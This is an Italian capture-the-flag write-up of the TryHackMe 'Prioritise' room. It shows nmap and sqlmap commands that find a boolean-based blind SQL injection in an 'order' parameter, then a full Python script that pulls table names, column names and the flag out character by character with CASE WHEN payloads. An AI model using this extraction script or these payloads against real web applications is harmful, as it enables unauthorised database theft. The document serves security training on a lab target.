
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/prioritise

In questa sfida esplorerai alcune tecniche di SQL Injection meno comuni.

Abbiamo questa nuova applicazione per le liste di cose da fare, dove ordiniamo i nostri compiti in base alla priorità! Ma è davvero così sicura...?

```
nmap -Pn -vv 10.10.37.188  
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

```

andiamo su
```
http://10.10.37.188/
```

qui è possibile inserire dei dati, ho provato delle semplici SQLi ma non funzionano
possiamo vedere che ci sono delle opzioni disponibili, quella dell'ordinamento dei files a prima vista potrebbe essere vulnerabile
procediamo con sqlmap
```
sqlmap -u 10.10.37.188
```

```
[09:53:49] [INFO] testing connection to the target URL
[09:53:49] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:53:49] [INFO] testing if the target URL content is stable
[09:53:50] [INFO] target URL content is stable
[09:53:50] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--forms --crawl=2'  
```

```
sqlmap -u  http://10.10.37.188/ --forms --crawl=2 
```

```
sqlmap -u "http://10.10.37.188/?order=" --level=5 --risk=3 --batch
```
```
GET parameter 'order' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1794 HTTP(s) requests:
---
Parameter: order (GET)
    Type: boolean-based blind
    Title: SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
    Payload: order=-5394 OR CASE WHEN 5431=5431 THEN 5431 ELSE JSON(CHAR(102,68,74,114)) END

```
sqlmap ci conferma la vulnerabilità del parametro order

```
sqlmap -u "http://10.10.37.188/index.php?order=-5394 OR CASE WHEN 5431=5431 THEN 1536 ELSE JSON(CHAR(112,99,74,112)) END" --level=3 --risk=2
```
```
[10:23:14] [INFO] resuming back-end DBMS 'sqlite' 
[10:23:14] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: order (GET)
    Type: boolean-based blind
    Title: SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
    Payload: order=-5394 OR CASE WHEN 5431=5431 THEN 5431 ELSE JSON(CHAR(102,68,74,114)) END
---
[10:23:14] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[10:23:14] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.37.188'

[*] ending @ 10:23:14 /2025-09-06/

```

```
cd /root/.local/share/sqlmap/output/10.10.37.188
```

```
ls
```

```
log  session.sqlite  target.txt
```

```
sqlite3 session.sqlite

```
possiamo anche utilizzare questo script trovato in rete per estrarre la flag

```
nano http://10.10.37.188/
```
```
#!/usr/bin/env python3
import requests
import sys
import string

url = "http://prioritise.thm/"
chars = list(string.ascii_letters + string.digits + "_") + [chr(i) for i in range(33, 127) if chr(i) not in string.ascii_letters + string.digits + "_"]
s = requests.Session()
ok = s.get(url + "?order=-7076 OR CASE WHEN 1536=1536 THEN 1536 ELSE JSON(CHAR(112,99,74,112)) END").content
max_retries = 3
results = {}

def brute_force(action, position, c, table_name='', column_name=''):
    payloads = {
        "table": f"?order=-7076 OR CASE WHEN (SELECT substr(name,{position},1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1)='{c}' THEN 1536 ELSE JSON(CHAR(112,99,74,112)) END",
        "column": f"?order=-7076 OR CASE WHEN (SELECT substr(name,{position},1) FROM pragma_table_info('{table_name}'))='{c}' THEN 1536 ELSE JSON(CHAR(112,99,74,112)) END",
        "flag": f"?order=-7076 OR CASE WHEN (SELECT substr({column_name},{position},1) FROM {table_name})='{c}' THEN 1536 ELSE JSON(CHAR(112,99,74,112)) END"
    }
    return s.get(url + payloads[action])

def brute_force_action(action):
    ans = []
    position = 1
    table_name = results.get('table', '')
    column_name = results.get('column', '')
    while True:
        found = False
        stop = True
        for c in chars:
            retries = 0
            while retries < max_retries:
                try:
                    sys.stdout.write(f"\r{action.capitalize()} so far: {''.join(ans)}{c}")
                    response = brute_force(action, position, c, table_name, column_name)
                    if response.content == ok:
                        ans.append(c)
                        found = True
                        stop = False
                        break
                    else:
                        break
                except Exception:
                    retries += 1
            if found:
                break
        if stop:
            break
        position += 1
    result = ''.join(ans).rstrip()
    results[action] = result
    sys.stdout.write(f"\r\033[K{action.capitalize()} found: {result}\n")

if __name__ == "__main__":
    try:
        for action in ["table", "column", "flag"]:
            brute_force_action(action)
    except KeyboardInterrupt:
        sys.stdout.write("\nUser interrupted the process. Exiting gracefully...\n")
        sys.exit(0)
```
Lo script Python è progettato per eseguire un attacco di **brute force** su un'applicazione web vulnerabile a SQL injection. Ecco una spiegazione dettagliata di cosa fa ogni parte dello script:

### Funzionalità Principali dello Script

1. **Importazione delle Librerie**:
    
    - `requests`: Utilizzata per effettuare richieste HTTP.
    - `sys`: Utilizzata per interagire con il sistema e gestire l'output.
    - `string`: Utilizzata per generare una lista di caratteri da utilizzare nel brute forcing.
2. **Configurazione dell'URL**:
    
    - L'URL di destinazione è impostato su `http://prioritise.thm/`.
3. **Generazione dei Caratteri**:
    
    - Viene creata una lista di caratteri (`chars`) che include lettere maiuscole e minuscole, numeri, il carattere di sottolineatura (`_`), e altri caratteri speciali (ASCII da 33 a 126).
4. **Sessione di Richiesta**:
    
    - Viene creata una sessione di richiesta (`s`) per mantenere lo stato tra le richieste.
5. **Payload di Controllo**:
    
    - Viene effettuata una richiesta iniziale per ottenere il contenuto di una risposta "ok" che verrà utilizzato per confrontare le risposte durante il brute forcing.
6. **Funzione `brute_force`**:
    
    - Questa funzione costruisce e invia i payload SQL per cercare di estrarre informazioni dal database. I payload sono costruiti per cercare:
        - **Nomi delle tabelle**.
        - **Nomi delle colonne**.
        - **Valori delle colonne**.
7. **Funzione `brute_force_action`**:
    
    - Questa funzione gestisce il processo di brute forcing per ciascuna azione (tabelle, colonne, flag).
    - Utilizza un ciclo per provare ogni carattere nella lista `chars` e costruisce il payload per ogni posizione del carattere da trovare.
    - Se il carattere è trovato (cioè la risposta del server è la stessa di quella "ok"), viene aggiunto alla risposta corrente.
8. **Ciclo Principale**:
    
    - Il ciclo principale esegue il brute forcing per le azioni "table", "column" e "flag", cercando di estrarre i nomi delle tabelle, i nomi delle colonne e i valori delle colonne dal database.
9. **Gestione delle Interruzioni**:
    
    - Se l'utente interrompe il processo (ad esempio, premendo Ctrl+C), lo script gestisce l'eccezione e termina in modo pulito.
```
chmod +x flag.py
```

```
python3 flag.py
```
ed ecco la nostra flag!
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# python3 flag.py
Table found: flag
Column found: flag
Flag found: flag{xxxxxxxxx}
```

